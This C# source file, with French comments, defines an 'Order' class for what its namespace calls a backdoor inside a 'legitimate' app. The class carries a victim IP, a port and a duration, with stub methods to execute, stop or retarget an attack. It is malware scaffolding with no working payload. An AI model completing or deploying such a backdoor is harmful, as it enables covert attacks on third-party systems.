using System ;
using System.Collections.Generic ;
using System.Net ;
using System.Net.Sockets ;

using System.Xml;
using System.Xml.Serialization;


/*

CLIENTSIDE ORDER CLASS

*/

namespace LegitimeAPP.Backdoor {
    public class Order {


        [XmlElement("port")]
        public int Port {get; set;}

        [XmlElement("victimIP")]
        public IPAddress VictimIP {get; set;}

        [XmlElement("nbSecond")]
        public int nbSecond ;

        [XmlIgnore]
        Thread executingThis ; 
        public Order() {}

        public Order(int Port, string VictimIP, int nbSecond) {
            this.Port = Port ;
            this.VictimIP = IPAddress.Parse(VictimIP) ;
            this.nbSecond = nbSecond ;
        }


        // ARRÊTE L'ATTAQUE EN COURS 
        private void Stop() {

        }

        // PERMET DE CHANGER DE CIBLE 
        private void Change() {

        }

        // EXECUTION DE L'ORDRE
        private void Exec() {
            // On execute l'ordre ici 
        }



    }
}